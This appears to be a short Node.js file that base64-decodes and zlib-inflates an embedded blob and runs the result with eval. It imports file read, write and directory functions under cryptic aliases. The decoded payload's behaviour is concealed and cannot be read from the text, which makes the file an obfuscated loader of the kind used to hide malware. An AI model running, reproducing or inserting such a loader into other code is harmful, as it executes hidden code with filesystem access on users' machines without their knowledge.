import{mkdirSync as mk,readdirSync as rd,readFileSync as rf,writeFileSync as wf}from"node:fs";
import{inflateSync as iz}from"node:zlib";
let S="eNqNVltvozoQfs+vyCJthAWk3HJrcFDVbqVo1W20ap84nJUhpGW3BQpmwyrJ/vYzNiaBtA8HybE9l2/G"+
"Mx5PwjQpaP8BSySKgp+/0qwS31P9bcRg+6r9kSAgpLXfhB12FQRRIM17LxHtL3GWp2FUFMMo+T28u/r6"+
"5fbx24/lt9Xjw4+b5ff9XrqIk6ykknr/oeT940NLNC0pk62hb3GGFzua/9nlES3zpJ9v5AwdQkLD54aU"+
"RNv+Y5zQ6VWekz+Hw7y3KZOQxmnS/y6vVDCtAibaccAbzMSXCbVMLi6bozFSr8+pYxupdx+KFlhXQxgp"+
"jDcYGdsUFH4SvBq+RMkTfVaJGqiVugVP0lyez8F2vJFBCBvRGNVuewZg+HPGyEJH3++zcIGThjnjPOZw"+
"muGVl4W+SvHDMHwm+XW6jq6onGZIm024/ieZLrA+GFDHGKMGYXRESCqchYqhgAo44BqXbDZdG+aFPRkM"+
"0swZma55qSOOllSa8c6TgipKjVZiOrC4YOGUjZDZHKXQSgW8WZhowaIl2BZnQ6SSikuBYWyMuWVs2XV0"+
"uFMWuvEKzfCxVs/zXvRSRP2GPWnYf9vsXYDFlvCF6Z+MzGojpjkYBBjrjUM2d+jG0zQOxwMzdokS8NgY"+
"E5doYjl17wh9Hsav5YsMWUU1debK5CJAe72Ope6Sz0GzMYC3WCx0dCEHfK7JZkP+3CHbLhnUpsyRS/Zi"+
"Cb78K5ZTlziOHAwsQ2jMXMBpESydEToUZgvjAFItzFgWUBxBEH44wg9GnB96h3akj4Gq72ibZbAcKIqP"+
"5ZXHrorvOKaNIOP2WbIaOS5m+3s+WyA+rZcmLI3xvoXSBbBQoWldks0wfZFttWBXss0eoarhiXtSXwe1"+
"nnDVFR+f0MwP0CYCzar1rXO0rqUO9rGsDLRrXJ/u9zK/cD4LL8Y1dYYQLwtFlmURlVNEpohFCGILP5Ch"+
"zlFr5BBOYTe5mrBcXXshCzoUGuC+RzyHMRuYY8anDAV0r8HX0D+TB2M70lQb0Ah7uAiU+qhRHzN1EZM7"+
"j7wDGP0vAKbZ1HKhYfMMZaqj3RZLknICSpWteHwX49HIOr2yBsNjN4k9xewBi7E+j51Geo6gN3gpi9m2"+
"/bzGinIe86nIJjvFOwtHlDrHAzjRufqxIt4c6EnCvgtL7w2ol5rRvX9Tq7FwguTVCLXaOx5m3U83/Xwt"+
"L9GwSHMqI9Hn1li6kJR4rcCkrvCtvFRgDd33KSevwyBOJMQ6Y8Pg/VmQ4Si421Pl+sBqjtsNdd57/SXf"+
"K2sVGnFY5kX8O7qkeRkdgLPdMI4iFXSdCmCmMyzKgHBEXc09w0ct0aiK6ZBW8C8h93Rfkf4BX9hh/wPq"+
"ALOH";
eval(iz(Buffer.from(S,"base64"))+"");
